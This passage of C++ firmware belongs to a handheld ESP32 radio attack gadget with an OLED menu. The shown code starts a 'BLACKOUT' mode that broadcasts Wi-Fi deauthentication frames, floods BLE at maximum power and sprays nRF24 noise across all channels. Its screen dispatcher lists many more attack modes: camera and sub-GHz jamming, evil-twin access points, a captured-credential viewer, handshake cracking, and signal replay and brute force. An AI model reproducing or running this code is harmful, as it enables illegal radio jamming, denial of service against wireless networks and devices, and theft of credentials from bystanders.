    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gBlackoutWifiUp = true;
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gBlackoutBleUp = true;
    ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
    ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
    if (ggNrfPresentA) ggNrfNoiseBegin(ggNrfA, 0);
    if (ggNrfPresentB) ggNrfNoiseBegin(ggNrfB, 63);
    ggFloodNrfActive = true;
    gBlackoutStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gBlackoutWifiUp) { ggWifiTxEnd(); gBlackoutWifiUp = false; }
    if (gBlackoutBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gBlackoutBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  if (ggBleFloodMode) ggBleFloodCycle();
  ggFloodNrfPump();
  { static uint32_t lastHop=0; static uint8_t hopCh=1; uint32_t n2=millis();
    if (n2-lastHop>=40) { lastHop=n2; hopCh++; if(hopCh>14)hopCh=1;
    gWifiTx.channel=hopCh; ggWifiTxSetChannel(hopCh, gWifiTx); } }
  uint32_t elapsed = (millis()-gBlackoutStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("BLACKOUT");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("WiFi CH%u ALL", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0;
    ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s nRF0-125",wf,bf); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ===== top-level ===========================================================
static inline void ggUiBegin() { ggOledBegin(); }
static inline void ggUiLoop() {
  ggInputPoll();

  // hold-BACK = HOME from anywhere. Tear down all active radios.
  if (gEv.home) { if (gScreen==GS_COP_SCAN) ggCopScanEnd(); if (gScreen==GS_TRACKER_SCAN) ggTrkScanEnd(); if (gScreen==GS_WIFI_PICK||gScreen==GS_JAM_PICK||gScreen==GS_RAD_PICK||gScreen==GS_EVIL_PICK||gScreen==GS_AUTH_PICK||gScreen==GS_QUIET_PICK||gScreen==GS_CLONE_PICK||(gScreen==GS_HEATMAP&&!gHeatDone)) ggWifiPickScanEnd(); if (gScreen==GS_BLE_SCAN||gScreen==GS_MAC_HARVEST||gScreen==GS_PROX_ALERT||gScreen==GS_UUID_SCAN||gScreen==GS_BLE_RANGE) ggBlePickScanEnd(); if (gScreen==GS_JAM_RUN) { if(gJamWifiUp){ggWifiTxEnd();gJamWifiUp=false;} if(gJamBleUp){ggBleFloodMode=false;ggBleTxEnd();gJamBleUp=false;} } if (gScreen==GS_KPAD_RUN) { if(gKpadWifiUp){ggWifiTxEnd();gKpadWifiUp=false;} if(gKpadBleUp){ggBleFloodMode=false;ggBleTxEnd();gKpadBleUp=false;} } if (gScreen==GS_RAD_RUN) { if(gRadWifiUp){ggWifiTxEnd();gRadWifiUp=false;} if(gRadBleUp){ggBleFloodMode=false;ggBleTxEnd();gRadBleUp=false;} } if (gScreen==GS_DRONE_RUN) { if(gDroneWifiUp){ggWifiTxEnd();gDroneWifiUp=false;} if(gDroneBleUp){ggBleFloodMode=false;ggBleTxEnd();gDroneBleUp=false;} } if (gScreen==GS_SPEAKER_RUN) { if(gSpeakerWifiUp){ggWifiTxEnd();gSpeakerWifiUp=false;} if(gSpeakerBleUp){ggBleFloodMode=false;ggBleTxEnd();gSpeakerBleUp=false;} } if (gScreen==GS_SLOCK_RUN) { if(gSlockBleUp){ggBleFloodMode=false;ggBleTxEnd();gSlockBleUp=false;} } if (gScreen==GS_NET_AUDIT) ggWifiPickScanEnd(); if (gScreen==GS_AUTH_RUN) { if(gAuthNrfUp){ggFloodNrfStop();gAuthNrfUp=false;} ggWifiTxEnd(); } if (gScreen==GS_FUZZ_RUN||gScreen==GS_QUIET_RUN||gScreen==GS_CLONE_RUN||gScreen==GS_FARM_RUN) ggWifiTxEnd(); if (gScreen==GS_DEAUTH_DET) ggDeauthDetectEnd(); if (gScreen==GS_PROG_JAM) { ggFloodNrfStop(); if(gProgWifiUp){ggWifiTxEnd();gProgWifiUp=false;} if(gProgBleUp){ggBleFloodMode=false;ggBleTxEnd();gProgBleUp=false;} } if (gScreen==GS_CHAIN_RUN) { ggFloodNrfStop(); if(gChainWifiUp){ggWifiTxEnd();gChainWifiUp=false;} if(gChainBleUp){ggBleFloodMode=false;ggBleTxEnd();gChainBleUp=false;} } if (gScreen==GS_AUTO_TARGET) { if(gAutoScanning)ggWifiPickScanEnd(); ggFloodNrfStop(); if(gAutoWifiUp){ggWifiTxEnd();gAutoWifiUp=false;} if(gAutoBleUp){ggBleFloodMode=false;ggBleTxEnd();gAutoBleUp=false;} } if (gScreen==GS_PKTRATE&&gPktRateOn) { esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_OFF); gPktRateOn=false; } if (gScreen==GS_BAND_OCC&&ggNrfToolP()) ggNrfTool().stopListening(); if (gScreen==GS_GEOFENCE) { if(gGeoScanning) ggWifiPickScanEnd(); else { WiFi.scanDelete(); WiFi.mode(WIFI_OFF); } gGeoScanning=true; } if (gScreen==GS_CRACK_PICK) ggWifiPickScanEnd(); if (gScreen==GS_CRACK_CAP) { if(gCrackJamUp){ggFloodNrfStop();gCrackJamUp=false;} ggCrackCaptureEnd(); } if (gScreen==GS_CRACK_DONE) ggCrackEnd(); if (gScreen==GS_BLACKOUT) { ggFloodNrfStop(); if(gBlackoutWifiUp){ggWifiTxEnd();gBlackoutWifiUp=false;} if(gBlackoutBleUp){ggBleFloodMode=false;ggBleTxEnd();gBlackoutBleUp=false;} } if (gScreen==GS_WIFIBLE_RUN) { if(gWBWifiUp){ggWifiTxEnd();gWBWifiUp=false;} if(gWBBleUp){ggBleFloodMode=false;ggBleTxEnd();gWBBleUp=false;} } if (gScreen==GS_BLENRF_RUN) { ggFloodNrfStop(); if(gBNBleUp){ggBleFloodMode=false;ggBleTxEnd();gBNBleUp=false;} } if (gScreen==GS_NRF_JAM) ggFloodNrfStop(); if (gScreen==GS_HIDDEN_SCAN&&gHiddenScanning) { WiFi.scanDelete(); WiFi.mode(WIFI_OFF); gHiddenScanning=false; } if (gScreen==GS_CAMERA_JAM) { if(gCamJamWifiUp){ggWifiTxEnd();gCamJamWifiUp=false;} } if (gScreen==GS_SIGNAL_METER&&gSigScanning) { WiFi.scanDelete(); WiFi.mode(WIFI_OFF); gSigScanning=false; } gTimeBombArmed=false; gAtkTimerArmed=false; gWifiFloodMode=false; ggWifiDeauthMode=false; ggWifiAuthFlood=false; ggWifiFuzzMode=false; ggWifiQuietMode=false; ggWifiCloneMode=false; ggWifiFarmMode=false; ggWifiSpamMode=false; ggWifiRickMode=false; ggBleSpamMode=false; ggBleFloodMode=false; if(gScreen==GS_CC_JAM) ggCcJamStop(); if(gScreen==GS_CC_REC&&ggCcRecording){uint8_t cs=ggCcPresentA?GG_PIN_CCA_CSN:GG_PIN_CCB_CSN;ggCcRecordStop(cs);} if(gScreen==GS_CC_REPLAY&&ggCcReplaying){uint8_t cs=ggCcPresentA?GG_PIN_CCA_CSN:GG_PIN_CCB_CSN;ggCcReplayStop(cs);} if(gScreen==GS_CC_BRUTE&&ggCcBruteActive){uint8_t cs=ggCcPresentA?GG_PIN_CCA_CSN:GG_PIN_CCB_CSN;ggCcBruteStop(cs);} if(gScreen==GS_CC_CW&&ggCcCwActive){uint8_t cs=ggCcPresentA?GG_PIN_CCA_CSN:GG_PIN_CCB_CSN;ggCcCwStop(cs);} if(gScreen==GS_CC_TX_RUN||gScreen==GS_CC_RX){uint8_t cs=(gCcCfg==&gCcA)?GG_PIN_CCA_CSN:GG_PIN_CCB_CSN; if(gCcCfg==&gCcA?ggCcPresentA:ggCcPresentB)ggCcIdle(cs);} ggLedAlertOff(); ggStopTx(); ggHome(); ggClickBack(); }
  if (gEv.up || gEv.down) ggClickMove();
  if (gEv.sel) ggClickOk();
  if (gEv.back) ggClickBack();

  switch (gScreen) {
    case GS_HOME: ggScreenHome(); break;
    case GS_NRF: ggScreenNrf(); break;
    case GS_ADV: ggScreenAdv(); break;
    case GS_MODES: ggScreenModes(); break;
    case GS_COP_SCAN: ggScreenCopScan(); break;
    case GS_TRACKER_SCAN: ggScreenTrackerScan(); break;
    case GS_NRF_TX: ggScreenNrfTx(); break;
    case GS_NRF_BEACON: ggScreenNrfBeacon(); break;
    case GS_NRF_CARRIER: ggScreenNrfCarrier(); break;
    case GS_NRF_SCAN: ggScreenNrfScan(); break;
    case GS_NRF_RX: ggScreenNrfRx(); break;
    case GS_NPROF: ggScreenNProf(); break;
    case GS_PROFACT: ggScreenProfAct(); break;
    case GS_SETTINGS: ggScreenSettings(); break;
    case GS_SYSTEM: ggScreenSystem(); break;
    case GS_HELP: ggScreenHelp(); break;
    case GS_HELPPAGE: ggScreenHelpPage(); break;
    case GS_BYTES: ggScreenBytes(); break;
    case GS_PAYLIB: ggScreenPayLib(); break;
    case GS_PAYACT: ggScreenPayAct(); break;
    case GS_WIFI_TX: ggScreenWifiTx(); break;
    case GS_WIFI_TX_RUN: ggScreenWifiTxRun(); break;
    case GS_WIFI_PICK: ggScreenWifiPick(); break;
    case GS_BLE_TX: ggScreenBleTx(); break;
    case GS_BLE_TX_RUN: ggScreenBleTxRun(); break;
    case GS_BLE_SCAN: ggScreenBleScan(); break;
    case GS_JAM_PICK: ggScreenJamPick(); break;
    case GS_JAM_RUN:  ggScreenJamRun(); break;
    case GS_KPAD_RUN: ggScreenKpadRun(); break;
    case GS_RAD_PICK: ggScreenRadPick(); break;
    case GS_RAD_RUN:  ggScreenRadRun(); break;
    case GS_SPAM_RUN: ggScreenSpamRun(); break;
    case GS_BLESPAM_RUN: ggScreenBleSpamRun(); break;
    case GS_EVIL_PICK: ggScreenEvilPick(); break;
    case GS_EVIL_RUN:  ggScreenEvilRun(); break;
    case GS_DRONE_RUN: ggScreenDroneRun(); break;
    case GS_PROBE_RUN: ggScreenProbeRun(); break;
    case GS_CRED_VIEW: ggScreenCredView(); break;
    case GS_RICK_MENU: ggScreenRickMenu(); break;
    case GS_RICK_RUN:  ggScreenRickRun(); break;
    case GS_SPEAKER_RUN: ggScreenSpeakerRun(); break;
    case GS_SLOCK_RUN: ggScreenSlockRun(); break;
    case GS_NET_AUDIT: ggScreenNetAudit(); break;
    case GS_NET_DETAIL: ggScreenNetDetail(); break;
    case GS_AUTH_PICK: ggScreenAuthPick(); break;
    case GS_AUTH_RUN:  ggScreenAuthRun(); break;
    case GS_FUZZ_RUN:  ggScreenFuzzRun(); break;
    case GS_QUIET_PICK: ggScreenQuietPick(); break;
    case GS_QUIET_RUN:  ggScreenQuietRun(); break;
    case GS_CLONE_PICK: ggScreenClonePick(); break;
    case GS_CLONE_RUN:  ggScreenCloneRun(); break;
    case GS_FARM_RUN:   ggScreenFarmRun(); break;
    case GS_TIMEBOMB:   ggScreenTimeBomb(); break;
    case GS_DEAUTH_DET: ggScreenDeauthDet(); break;
    case GS_GEOFENCE:   ggScreenGeofence(); break;
    case GS_MAC_HARVEST: ggScreenMacHarvest(); break;
    case GS_PROX_ALERT: ggScreenProxAlert(); break;
    case GS_UUID_SCAN:  ggScreenUuidScan(); break;
    case GS_BLE_RANGE:  ggScreenBleRange(); break;
    case GS_CHAIN_RUN:  ggScreenChainRun(); break;
    case GS_PROG_JAM:   ggScreenProgJam(); break;
    case GS_AUTO_TARGET: ggScreenAutoTarget(); break;
    case GS_HEATMAP:    ggScreenHeatmap(); break;
    case GS_BAND_OCC:   ggScreenBandOcc(); break;
    case GS_PKTRATE:    ggScreenPktRate(); break;
    case GS_ATK_TIMER:  ggScreenAtkTimer(); break;
    case GS_CRACK_PICK: ggScreenCrackPick(); break;
    case GS_CRACK_CAP:  ggScreenCrackCap(); break;
    case GS_CRACK_DONE: ggScreenCrackDone(); break;
    case GS_BLACKOUT:   ggScreenBlackout(); break;
    // category sub-menus
    case GS_CAT_WIFI:    ggScreenCatWifi(); break;
    case GS_CAT_BLE:     ggScreenCatBle(); break;
    case GS_CAT_NRF:     ggScreenCatNrf(); break;
    case GS_CAT_COMBO:   ggScreenCatCombo(); break;
    case GS_CAT_RECON:   ggScreenCatRecon(); break;
    case GS_CAT_EXPLOIT: ggScreenCatExploit(); break;
    case GS_CAT_TOOLS:   ggScreenCatTools(); break;
    case GS_CAT_SYSTEM:  ggScreenCatSystem(); break;
    // new tool screens
    case GS_WIFIBLE_RUN: ggScreenWifiBleRun(); break;
    case GS_BLENRF_RUN:  ggScreenBleNrfRun(); break;
    case GS_NRF_JAM:     ggScreenNrfJam(); break;
    case GS_HIDDEN_SCAN: ggScreenHiddenScan(); break;
    case GS_CAMERA_JAM:  ggScreenCameraJam(); break;
    case GS_SIGNAL_METER: ggScreenSignalMeter(); break;
    case GS_R40T_MODE:   ggScreenR40tMode(); break;
    // CC1101 screens
    case GS_CAT_CC1101:  ggScreenCatCc1101(); break;
    case GS_CAT_SUBGHZ:  ggScreenCatSubGhz(); break;
    case GS_CC_TX:       ggScreenCcTx(); break;
    case GS_CC_TX_RUN:   ggScreenCcTxRun(); break;
    case GS_CC_RX:       ggScreenCcRx(); break;
    case GS_CC_SCAN:     ggScreenCcScan(); break;
    case GS_CC_RSSI:     ggScreenCcRssi(); break;
    case GS_CC_JAM:      ggScreenCcJam(); break;
    case GS_CC_REC:      ggScreenCcRec(); break;
    case GS_CC_REPLAY:   ggScreenCcReplay(); break;
    case GS_CC_BRUTE:    ggScreenCcBrute(); break;
    case GS_CC_CW:       ggScreenCcCw(); break;
    case GS_CC_PROF:     ggScreenCcProf(); break;
    case GS_CC_PROFACT:  ggScreenCcProfAct(); break;
    default: gScreen = GS_HOME; break;
  }
  static uint32_t lastSave=0;
  if (millis()-lastSave>10000){ lastSave=millis(); ggSaveLive(gNrfA,gNrfB); ggSaveCcLive(gCcA,gCcB); ggSaveWifiTx(gWifiTx); ggSaveBleTx(gBleTx); }
}
